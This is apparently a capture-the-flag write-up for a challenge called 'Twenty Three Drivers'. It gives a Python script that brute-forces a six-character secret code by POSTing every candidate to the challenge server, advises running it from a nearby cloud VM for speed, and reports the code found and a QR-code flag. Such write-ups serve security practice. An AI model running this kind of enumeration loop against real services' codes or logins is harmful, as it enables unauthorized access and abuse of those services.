# Twenty Three Drivers

The secret code is in the format `23D[0-9A-Z]{3}`, enumerate it:

```python
import subprocess
import requests
import sys
alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for c1 in alphabet:
    for c2 in alphabet:
        sys.stdout.flush()
        for c3 in alphabet:
            code = f"23D{c1}{c2}{c3}"
            print(code)
            r = requests.post('https://23drivers.ctf.zone/', data={'secret_code': code})
            if "Unknown code" not in r.text and "already used" not in r.text:
                print(r.text, c1, c2, c3)
                exit()
```

To accelerate enumeration, create a virtual machine in eu-west-1 region of AWS.

The secret code is found to be `23DF2W`. A png is given when entering the correct secret code. Scanning the QR code will lead to the flag.

Solved!
